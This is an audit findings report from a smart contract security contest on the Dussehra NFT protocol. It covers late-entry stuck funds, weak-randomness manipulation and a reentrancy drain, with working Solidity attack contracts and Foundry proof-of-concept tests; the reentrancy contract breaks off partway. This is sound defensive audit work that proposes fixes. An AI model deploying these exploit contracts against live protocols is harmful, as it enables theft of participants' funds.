# First Flight #17: Dussehra - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. `Dussehra::enterPeopleWhoLikeRam()` does not share timestamp constraints found in other functions allowing participants to enter after funds have been withdrawn](#H-01) (NOT ACCEPTED)
    - ### [H-02. `ChoosingRam::increaseValuesOfParticipants()` does not update `ChoosingRam::isRamSelected` allowing `RamNFT::organiser` to exploit weak randomness in `ChoosingRam::selectRamIfNotSelected`](#H-02)
    - ### [H-03. Weak Randomness in `ChoosingRam::increaseValuesOfParticipants()` enables users to manipulate the function's outcome](#H-03)
- ## Medium Risk Findings
    - ### [M-01. `RamNFT::organiser` can exploit `Dussehra::killRavana` and drain all funds with reentrancy attack](#M-01)
    - ### [M-02. Missing input validation in `ChoosingRam::increaseValuesOfParticipants()` enables users to provide the same argument for both parameters](#M-02)
    - ### [M-03. `Dussehra::killRavana()` is the only way to disburse funds and its timestamp constraints create the potential for stuck funds](#M-03) (NOT ACCEPTED)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #17

### Dates: Jun 6th, 2024 - Jun 13th, 2024

[See more contest details here](https://www.codehawks.com/contests/clx1ufwjy006g3d8ddjdk3qfr)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 3 (1 not accepted)
   - Medium: 3 (1 not accepted)
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. `Dussehra::enterPeopleWhoLikeRam()` does not share timestamp constraints found in other functions allowing participants to enter after funds have been withdrawn (NOT ACCEPTED)            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L52

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L71

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L47

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L87

## Summary
The entry point into the protocol is `Dussehra::enterPeopleWhoLikeRam`.
```js
function enterPeopleWhoLikeRam() public payable {
	if (msg.value != entranceFee) {
		revert Dussehra__NotEqualToEntranceFee();
	}
	if (peopleLikeRam[msg.sender] == true){
		revert Dussehra__AlreadyPresent();
	}

	peopleLikeRam[msg.sender] = true;
	WantToBeLikeRam.push(msg.sender);
	ramNFT.mintRamNFT(msg.sender);
	emit PeopleWhoLikeRamIsEntered(msg.sender);
}
```
- A `RamNFT` is minted when `msg.sender` provides the `Dussehra::entranceFee`
- The user is pushed into the `Dussehra::WantToBeLikeRam` array

The `Dussehra::killRavana()` function calculates the distribution of fees between `RamNFT::organiser` and one lucky entrant
```js
function killRavana() public RamIsSelected {
	if (block.timestamp < 1728691069) {
		revert Dussehra__MahuratIsNotStart();
	}

	if (block.timestamp > 1728777669) {
		revert Dussehra__MahuratIsFinished();
	}

	IsRavanKilled = true;

	uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
	totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;

	(bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
	require(success, "Failed to send money to organiser");
}
```
- Without this function, there is no other way for the winning entrant `ChoosingRam::selectedRam` or `RamNFT::organiser` to collect fees
- This function can only be called within a window of time dictated by fixed timestamps

Other functions also have important timestamp constraints
`ChoosingRam::selectRamIfNotSelected()` 
```js
function selectRamIfNotSelected() public RamIsNotSelected OnlyOrganiser {
	if (block.timestamp < 1728691200) {
		revert ChoosingRam__TimeToBeLikeRamIsNotFinish();
	}

	if (block.timestamp > 1728777600) {
		revert ChoosingRam__EventIsFinished();
	}
	...
}
```
`ChoosingRam::increaseValuesOfParticipants()`
```js
function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
	public
	RamIsNotSelected
{
	...
	
	if (block.timestamp > 1728691200) {
		revert ChoosingRam__TimeToBeLikeRamFinish();
	}
	...
}
```

The issue is that the protocol runs for a period of time. After funds have been disbursed to `RamNFT::organiser` and withdrawn by `ChoosingRam::selectedRam`, the protocol is "finished". Despite the ending, the story continues and users are still able to enter the protocol paying the entrance fee. These late entrance fees will remain stuck in the contract.

## Vulnerability Details
This foundry test highlights the oversight:
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dussehra} from "../../src/Dussehra.sol";
import {ChoosingRam} from "../../src/ChoosingRam.sol";
import {RamNFT} from "../../src/RamNFT.sol";

contract CounterTest is Test {
    error Dussehra__MahuratIsFinished();

    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;

    address public organiser = makeAddr("organiser");
    uint256 public constant PICK_A_NUMBER = 5;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        // organizer deploys contracts
        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }

    modifier participants() {
        // an arbitrary number of participants enter the protocol
        for (uint256 i =0; i< PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
            vm.stopPrank();
        }
        _;
    }

    function test_joinAfterComplete() public participants {
        // we warp ahead to where the organizer declares a `ChoosingRam::selectedRam`
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        address selected = choosingRam.selectedRam();
        console.log("selected: ", selected);
        vm.stopPrank();

        uint256 contractBalance = address(dussehra).balance;
        console.log("contractBalance start: ", contractBalance);

        // the `ChoosingRam::selectedRam` calls the `Dussehra::killRavana` function
        vm.startPrank(address(selected));
        dussehra.killRavana();
        vm.stopPrank();

        contractBalance = address(dussehra).balance;
        console.log("contractBalance after kill: ", contractBalance);

        uint256 ramwinningAmount = dussehra.totalAmountGivenToRam();
        console.log("ramwinningAmount before withdraw: ", ramwinningAmount);

        // the `ChoosingRam::selectedRam withdraws funds
        vm.startPrank(address(selected));
        dussehra.withdraw();
        vm.stopPrank();

        contractBalance = address(dussehra).balance;
        console.log("contractBalance after withdraw: ", contractBalance);

        ramwinningAmount = dussehra.totalAmountGivenToRam();
        console.log("ramwinningAmount after withdraw: ", ramwinningAmount);

        // we warp ahead to the `event finshed` timestamp, and more players enter
        vm.warp(1728777669 + 1);
        address[] memory fools = new address[](5);

        for (uint256 i =0; i< 5; i++) {
            string memory stringNumber = vm.toString(i);
            string memory base = "fools";
            string memory fullString = string(abi.encodePacked(base, stringNumber));
            fools[i] = makeAddr(fullString);
            vm.deal(fools[i], 1 ether);
            vm.startPrank(fools[i]);
            dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
            vm.stopPrank();
        }

        contractBalance = address(dussehra).balance;
        console.log("contractBalance after fools: ", contractBalance);
        ramwinningAmount = dussehra.totalAmountGivenToRam();
        console.log("ramwinningAmount after fools: ", ramwinningAmount);

		// the `Dussehra::killRavana` function cannot be called after the timestamp we warped to 
vm.expectRevert(abi.encodeWithSelector(Dussehra__MahuratIsFinished.selector));
        vm.startPrank(address(selected));
        dussehra.killRavana();
        vm.stopPrank();
    }
}
//  selected:  0x82A978B3f5962A5b0957d9ee9eEf472EE55B42F1
//  contractBalance start:  5000000000000000000
//  contractBalance after kill:  2500000000000000000
//  ramwinningAmount before withdraw:  2500000000000000000
//  contractBalance after withdraw:  0
//  ramwinningAmount after withdraw:  0
//  contractBalance after fools:  5000000000000000000
//  ramwinningAmount after fools:  0
```
- The test runs through setting up the contracts, entering participants, declaring a winner, and disbursing funds
- After warping to the period where the "contest is finished" found in `Dussehra::killRavana()`(1728777669), new participants are still able to enter the protocol
- `Dussehra::killRavana()` cannot be called at this point, and as we learned, this function is the only way to calculate who gets how much
- The `Dussehra::entranceFee` paid by all the new entrants will remain stuck in this contract

## Impact
This is a high risk vulnerability that leaves funds stuck in the contract.

The protocol uses a function `Dussehra::killRavana()`, to calculate the disbursement of fees.  The function can only be called within a specific time frame. At the end of this time frame, the protocol is considered to be finished. But there is no mechanism in place preventing new entrants.

The protocol does not stop new participants from joining, even though there are timestamp constraints placed on every other function. `Dussehra::enterPeopleWhoLikeRam` needs to implement time constraints as well. If left as is, it will lead to a loss of funds resulting from a mistake that can easily be made by unaware, hopeful participants.

## Tools Used
- Manual Review
- Foundry

## Recommendations
The change needed for `Dussehra::enterPeopleWhoLikeRam` is simple. Just add a timestamp constraint.
```diff
function enterPeopleWhoLikeRam() public payable {
+   if (block.timestamp > 1728691200) {
+      revert ChoosingRam__TimeToBeLikeRamIsFinished();
+   }
	...
}
```
- This will prevent participants from entering after the window opens for `RamNFT::organiser` to call `ChoosingRam::selectRamIfNotSelected()`
## <a id='H-02'></a>H-02. `ChoosingRam::increaseValuesOfParticipants()` does not update `ChoosingRam::isRamSelected` allowing `RamNFT::organiser` to exploit weak randomness in `ChoosingRam::selectRamIfNotSelected`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L14

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L83

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L90

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/RamNFT.sol#L21

## Summary
The objective of this protocol is to grant the status of `ChoosingRam::isRamSelected` to one of the participants that enters the protocol through `Dussehra::enterPeopleWhoLikeRam()`. The `ChoosingRam::increaseValuesOfParticipants()` function or the `ChoosingRam::selectRamIfNotSelected()` function both have the ability to select a participant to be the `ChoosingRam:selectedRam` .  This lucky participant will get 50% of the entrance fees required to mint a `RamNFT` (`Dussehra::totalAmountGivenToRam`) 

Both of the functions mentioned above have an important modifier: `ChoosingRam::`
```js
modifier RamIsNotSelected() {
	require(!isRamSelected, "Ram is selected!");
	_;
}
```

`ChoosingRam::isRamSelected` is a boolean that should change to true when `ChoosingRam:selectedRam` has been chosen. We can see that in `ChoosingRam::selectRamIfNotSelected()`, the value is updated:
```js
    function selectRamIfNotSelected() public RamIsNotSelected OnlyOrganiser {
		...
        isRamSelected = true;
    }
```
- Only the `RamNFT::organizer` can call this function.

Presumably, this change should also occur in `ChoosingRam::increaseValuesOfParticipants()`. We can make this assumption because the function has the modifier mentioned earlier.  The problem is, `ChoosingRam::increaseValuesOfParticipants()` does not update `ChoosingRam::isRamSelected`. 
```js
function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
	    ...
        if (random == 0) {
			...
            selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
            }
        } else {
            ...
            selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
            }
        }
    }
```
- The function chooses an address for `ChoosingRam::selectedRam`, but it does not update `ChoosingRam::isRamSelected`.

 `ChoosingRam::selectRamIfNotSelected()` can be called by `RamNFT::organizer` after this timestamp:
```js
if (block.timestamp < 1728691200) {
// Saturday, October 12, 2024 12:00:00 AM GMT
```
- Since `ChoosingRam::increaseValuesOfParticipants()` does not update `ChoosingRam::isRamSelected`, `RamNFT::organizer` will always be the actor that makes `ChoosingRam::selectedRam` official. 

I was thinking about submitting this as a bug, but on its own, it's a Low at best. It's not a huge deal if `ChoosingRam::selectedRam` can constantly by changed until the timestamp deadline. The real threat lies in the attack opportunity provided to `RamNFT::organiser` thanks to this oversight. 

`RamNFT::organizer` has more than enough information to dictate who the winner will be by exploiting weak randomness in `ChoosingRam::selectRamIfNotSelected`:
```js
uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
```
- This calculation will produce a number that will be used to choose a "random" `RamNFT` id.
    - Along with the timestamps, `RamNFT::tokenCounter` (the amount of participants in the protocol), determines the "random" number 
- The owner of this nft will become `ChoosingRam::selectedRam` granting them claim to 50% of the mint fees.

## Vulnerability Details
The attack can occur in a few ways. In its simplest form, `RamNFT::organiser` can collude with a participant and choose them to be `ChoosingRam::selectedRam`. An attack contract may not be necessary, but it makes the attack much easier. If the `RamNFT::organiser` chooses to go with the simple route, they would have to deploy their attack at very specific times. This function in Foundry shows how `RamNFT::organiser` can figure out when to attack.
##### Find Random Number
```js
function test_findZeroRandomness() public participants {
	uint256 startTime = 1728691200;
	uint256 endTime = 1728777600;
	uint256 amountOfRandom = 0;
	uint256 counter = ramNFT.tokenCounter();

	console.log("counter: ", counter);
	
	// Loop through the range of timestamps
	for (uint256 timestamp = startTime+1; timestamp <= endTime; timestamp++) {
		vm.warp(timestamp);

		uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % counter;
		// check how many times 0 occurs
		if (random == 0) {
			console.log("Found a zero randomness at timestamp: ", timestamp);
			amountOfRandom++;
		}
	}
	console.log("random: ", amountOfRandom);
}
// counter: 101
// random: 849
```
- In this example, `RamNFT::organiser` wants the first entry to be the `ChoosingRam::selectedRam`: ``if random == 0``
- The function will keep track of all the timestamps that would produce 0 based on the value of `RamNFT::tokenCounter`
	- A counter of `101` will produce `0` 849 times within the predetermined time constraints of `ChoosingRam::selectRamIfNotSelected`
- Without an attack contract, `RamNFT::organiser` would have to make a precise call of`ChoosingRam::selectRamIfNotSelected()` during one of the returned timestamps

##### Using an attack contract gives `RamNFT::organiser` room for error:
```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IChoosingRam {
    function selectRamIfNotSelected() external;
}

contract OrganizerChoosingRam {
    address private immutable owner;
    IChoosingRam choosingRam;

    constructor() {
        owner = msg.sender;
    }

    function setContract(address _chooingRam) public {
        if (msg.sender != owner) {
            revert();
        }
        choosingRam = IChoosingRam(_chooingRam);
    }

    function attack(uint256 myId, uint256 counter) public {
         if (msg.sender != owner) {
            revert();
        }

        bool found = false;
        uint256 random;

        while (!found) {
            random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % counter;

            if (random == myId) {
                found = true;
            }
        }
        choosingRam.selectRamIfNotSelected();
    }

    function withdraw() public {
        if (msg.sender != owner) {
            revert();
        }

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) {
            revert();
	    }
    }
  
    receive() external payable {}
}
```
- The malicious actor would use this contract to deploy `RamNFT` which would mean that this contract would function as `RamNFT::organiser`
- The malicious actor could enter the protocol and choose their `RamNFT` to become `ChoosingRam::selectedRam` (or collude with another participant)

##### Foundry Setup:
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dussehra} from "../../src/Dussehra.sol";
import {ChoosingRam} from "../../src/ChoosingRam.sol";
import {RamNFT} from "../../src/RamNFT.sol";
import {OrganizerChoosingRam} from "../../src/attacks/OrganizerAttack.sol";

contract OrganizerAttackTest is Test {
    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    OrganizerChoosingRam attack;

    address public organiser = makeAddr("organiser");

    uint256 public constant PICK_A_NUMBER = 100;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        // organizer deploys attack contract
        vm.startPrank(organiser);
        attack = new OrganizerChoosingRam();
        vm.stopPrank();

        // attack contract is used as "organizer"
        vm.startPrank(address(attack));
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();  

        vm.deal(organiser, 10 ether);
        vm.startPrank(organiser);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
    }

	// enter any number of participants
    modifier participants() {
        for (uint256 i =0; i< PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
            vm.stopPrank();
        }
        _;
    }
}
```
- Organizer deploys attack contract and uses the attack contract to deploy `RamNFT`
- Organizer enters the protocol as first participant (`tokenId: 0`)
- We can create an arbitrary amount of users (100 in this example) setting the counter (101 in this example)

##### Foundry Test:
```js
function test_organizerAttackWorks() public participants {
	// 5th entrant has nft stats boosted, but does not become `ChoosingRam::selectedRam`
	vm.startPrank(organiser);
	choosingRam.increaseValuesOfParticipants(0, 4);
	choosingRam.increaseValuesOfParticipants(0, 4);
	choosingRam.increaseValuesOfParticipants(0, 4);
	choosingRam.increaseValuesOfParticipants(0, 4);    
	choosingRam.increaseValuesOfParticipants(0, 4);
	assertEq(ramNFT.getCharacteristics(4).isSatyavaakyah, true);
	assertEq(choosingRam.isRamSelected(), false);
	vm.stopPrank();


	// warp to where `ChoosingRam::selectRamIfNotSelected()` can be called 
	vm.warp(1728691200 + 1);
	uint256 counter = ramNFT.tokenCounter();
	uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
	console.log("counter: ", counter);
	console.log("randomCheck: ", random);

	// attacker sets `ChoosingRam` contract
	vm.startPrank(organiser);
	attack.setContract(address(choosingRam));
	vm.stopPrank();

	// warp to a block found with `test_findZeroRandomness`
	vm.warp(1728774915);
	random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
	console.log("randomAttack: ", random);

	vm.startPrank(organiser);
	attack.attack(0, counter);
	address selected = choosingRam.selectedRam();
	console.log("selected: ", selected);
	console.log("organizer: ", organiser);
	assertEq(choosingRam.isRamSelected(), true);
	vm.stopPrank();
}
//  counter:  101
//  randomCheck:  37
//  randomAttack:  0
//  selected:  0xe81f335f0c35d66819c4dF203d728f579880b4b1
//  organizer:  0xe81f335f0c35d66819c4dF203d728f579880b4b1
```
- The test shows `ChoosingRam::increaseValuesOfParticipants` maxing out the `RamNFT` for entrant 5
	- It does not trigger `ChoosingRam::isSelected`
- The organizer figures out which blocks they can exploit
	- In the wild, the attack function could be triggered near one of these timestamps
	- Without a contract, the malicious actor's call of `ChoosingRam::selectRamIfNotSelected()` would need to be much more precise

## Impact
This is a high rsk vulnerability that enables the `RamNFT::organiser` to acquire all the funds.
 
Users enter this protocol with the belief that they have a chance to win 50% of the entrance fees if they become `ChoosingRam:selectedRam`. This vulnerability erases the implied randomness of the protocol and gives all of the rewards to `RamNFT::organiser`. 

`ChoosingRam::increaseValuesOfParticipants()` never sets the `ChoosingRam::isRamSelected` boolean to `true`. `RamNFT::organiser` will always set `ChoosingRam:selectedRam` with the `ChoosingRam::selectRamIfNotSelected()` function. 

The malicious actor can: 
- Use an attack contract to serve the role of `RamNFT::organiser` while entering the contest themselves
- Or collude with an entrant.
<br> 
Either way, the malicious actor is in control of choosing `ChoosingRam:selectedRam` removing randomness from the equation. With or without an attack contract, the actor pulling the strings of `RamNFT::organiser` will receive a majority of the funds. They can choose to collude with a participant to get a share of  `Dussehra::totalAmountGivenToRam` along with the remaining 50%. Or, they can take 100%.   

## Tools Used
- Manual Review
- Foundry

## Recommendations
**When the conditions are met, `ChoosingRam::increaseValuesOfParticipants` should set `ChoosingRam::isSelected` to true**
```diff
function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
	    ...
        if (random == 0) {
			...
            selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
+           isRamSelected = true;
            }
        } else {
            ...
            selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
+           isRamSelected = true; 
            }
        }
    }
```
- This will put some control of the outcome in the hands of the participants.
- Without this change, `RamNFT::organiser` has all of the influence

**We can consider not allowing contracts to become `RamNFT::organiser`**
`RamNFT`
```js
function _isContract(address account) internal view returns (bool) { 
	uint256 size; 
	assembly { 
		size := extcodesize(account) 
	} 
	return size > 0; 
}
```
`RamNFT::constructor()`
```diff
constructor() ERC721("RamNFT", "RAM") {
+   if (_isContract(msg.sender)) {
+       revert();
+   }
	tokenCounter = 0;
	organiser = msg.sender;
}
```
- This is a step in the right direction, but it doesn't address the main problem

**The most important mitigation step is to use off-chain methods such as ChainlinkVRF to create randomness.**
```diff
function selectRamIfNotSelected() public RamIsNotSelected OnlyOrganiser {
		...
-        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
        ...
    }
```
- This implementation of "randomness" gives the malicious actor all the information they need to get their desired output.
- It should not be used
## <a id='H-03'></a>H-03. Weak Randomness in `ChoosingRam::increaseValuesOfParticipants()` enables users to manipulate the function's outcome            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L51

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L16

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L81

## Summary
The `ChoosingRam::increaseValuesOfParticipants()` function is intended to increase the attributes of the user's `RamNFT`. When a `RamNFT` is minted, it stores the address of the minter (`RamNFT::CharacteristicsOfRam.ram`) and defaults 5 characteristics to false:
```js
Characteristics[newTokenId] = CharacteristicsOfRam({
	ram: to,
	isJitaKrodhah: false,
	isDhyutimaan: false,
	isVidvaan: false,
	isAatmavan: false,
	isSatyavaakyah: false
});
```
When all of these characteristics are set to true, `RamNFT::CharacteristicsOfRam.ram` becomes the `ChoosingRam::selectedRam`. The `ChoosingRam::selectedRam` has access to the `Dussehra::withdraw()` function. `Dussehra::withdraw()` allows the `ChoosingRam::selectedRam` to have a share of the funds derived from each entry into the protocol (`Dussehra::totalAmountGivenToRam`)

The `ChoosingRam::increaseValuesOfParticipants()` requires two `uint256` arguments
```js
function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
```

The function uses this formula to create a random number:
`uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;`
- If the random number is 0, then a characteristic of `tokenIdOfChallenger`'s (`msg.sender`) `RamNFT` will be flipped to true. If a user is able to do this 5 times, then their address will be chosen as `ChoosingRam::selectedRam`. 
- If the random number is not 0, then the `RamNFT` for the second argument provided (presumably a user chosen at random) will have a characteristic switched to true

The user chosen as `ChoosingRam::selectedRam` will have access to the `Dussehra::withdraw()` function which will give 50% of the total mint funds to the user.
## Vulnerability Details
This is an example attack contract:
- The `attack` function will take two `uint256` parameters that will be passed to `ChoosingRam::increaseValuesOfParticipants()`
- A `while loop` is utilized to continuously run the `random` calculation until `random` = 0.
- When `random` = 0, the contract calls `ChoosingRam::increaseValuesOfParticipants`
```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IChoosingRam {
    function increaseValuesOfParticipants(uint256, uint256) external;
}

contract AttackChoosingRam is IERC721Receiver {
    IChoosingRam immutable target;
    address private immutable owner;

    constructor(address _target) {
        target = IChoosingRam(_target);
        owner = msg.sender;
    }

    function attack(uint256 myId, uint256 dummy) public {
        bool found = false;
        uint256 random;

        while (!found) {
            random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))) % 2;
            if (random == 0) {
                found = true;
            }
        }
        
        target.increaseValuesOfParticipants(myId, dummy);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function withdraw() public {
        if (msg.sender != owner) {
            revert();
        }

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {}
}
```
- The contract should be able to receive ether (so it can enter the protocol and claim the reward)
- The contract should be able to receive NFTs
- A withdraw function for the attacker to withdraw the funds

This foundry test shows that the attacker can call the function 5 times and become `ChoosingRam::selectedRam`:
```js
function setUp() public {
	vm.startPrank(organiser);
	ramNFT = new RamNFT();
	choosingRam = new ChoosingRam(address(ramNFT));
	dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
	ramNFT.setChoosingRamContract(address(choosingRam));
	vm.stopPrank();

	vm.startPrank(attacker);
	attack = new AttackChoosingRam(address(choosingRam));
	vm.stopPrank();

	vm.deal(address(attack), 10 ether);
	vm.deal(player1, 10 ether);

	vm.startPrank(address(attack));
	dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
	vm.stopPrank();

	vm.startPrank(player1);
	dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
	vm.stopPrank();
}

function test_attackWorks() public {
	vm.startPrank(attacker);
	attack.attack(0,1);
	assertEq(ramNFT.getCharacteristics(0).isJitaKrodhah, true);
	
	attack.attack(0,1);
	assertEq(ramNFT.getCharacteristics(0).isDhyutimaan, true);

	attack.attack(0,1);
	assertEq(ramNFT.getCharacteristics(0).isVidvaan, true);

	attack.attack(0,1);
	assertEq(ramNFT.getCharacteristics(0).isAatmavan, true);

	attack.attack(0,1);
	assertEq(ramNFT.getCharacteristics(0).isSatyavaakyah, true);

	assertEq(choosingRam.selectedRam(),address(attack));  
	vm.stopPrank();
}
```

## Impact
This is a high risk vulnerability that allows a user to manipulate the "randomness" mechanic employed by the protocol.

Due to weak randomness, a user can easily manipulate `ChoosingRam::increaseValuesOfParticipants()` to quickly become `ChoosingRam::selectedRam`. The `ChoosingRam::selectedRam` status allows the user to withdraw 50% of the minting funds through the `Dussehra::withdraw()` function. 

The system is meant to be random, and the funds are meant to be rewarded to a user through luck based mechanics. 

A user can create an attack contract that manipulates the randomness used in the protocol rendering the randomness useless. Anyone that deploys a simple attack contract will gain 50% of the funds raised with ease. 

## Tools Used
- Manual Review
- Foundry

## Recommendations
Don't allow contracts to enter the protocol.
- When a user tries to enter the protocol through `Dussehra::enterPeopleWhoLikeRam`, we can prevent contracts from entering:
```js
function _isContract(address account) internal view returns (bool) { 
	uint256 size; 
	assembly { 
		size := extcodesize(account) 
	} 
	return size > 0; 
}
```

`Dussehra::enterPeopleWhoLikeRam()`
```diff
function enterPeopleWhoLikeRam() public payable {
	...
+   if (_isContract(msg.sender)) {
+       revert();
+   }
    ...
}
```
- This would mitigate users from entering contracts that exploit weak randomness, but this is still something that may be exploited by validators.

The best solution would be to use off-chain methods such as ChainlinkVRF to create randomness. 
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. `RamNFT::organiser` can exploit `Dussehra::killRavana` and drain all funds with reentrancy attack            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L67

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L77

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L19

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L16

## Summary
This is an NFT protocol that aims to share the mint fees between the `RamNFT::organiser` and `ChoosingRam::selectedRam`. The function `Dussehra::killRavana` handles dividing the mint fees and sending half to the `RamNFT::organiser`:
```js
function killRavana() public RamIsSelected {
        if (block.timestamp < 1728691069) {
            //@auditTIME Friday, October 11, 2024 11:57:49 PM GMT
            revert Dussehra__MahuratIsNotStart();
        }
        if (block.timestamp > 1728777669) {
            //@auditTIME Sunday, October 13, 2024 12:01:09 AM GMT
            revert Dussehra__MahuratIsFinished();
        }

        IsRavanKilled = true;

        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;

        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;

        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
}
```
- The function can only be called if `ChoosingRam::isRamSelected` is true
- The function can only be called within a certain time frame, and it can be called by anyone
- The fee is divided and half the amount is immediately transferred to `RamNFT::organiser`
- The other half is claimed by `ChoosingRam::selectedRam` through the `Dussehra::withdraw` function

A malicious contract can act as the organizer and drain all the funds.

## Vulnerability Details
`Dussehra::killRavana` distributes funds to `RamNFT::organiser` making an external call. If `RamNFT::organiser` is a malicious contract, it can drain all the funds.<br>
<br>
`Attack Contract`:
```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IChoosingRam {
    function selectRamIfNotSelected() external;
}

interface IDussehra {
    function killRavana() external;
}

contract OrganizerReenter {
    address private immutable owner;
    IChoosingRam choosingRam;
    IDussehra dussehra;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setContracts(address _dussehra, address _chooingRam) public onlyOwner{
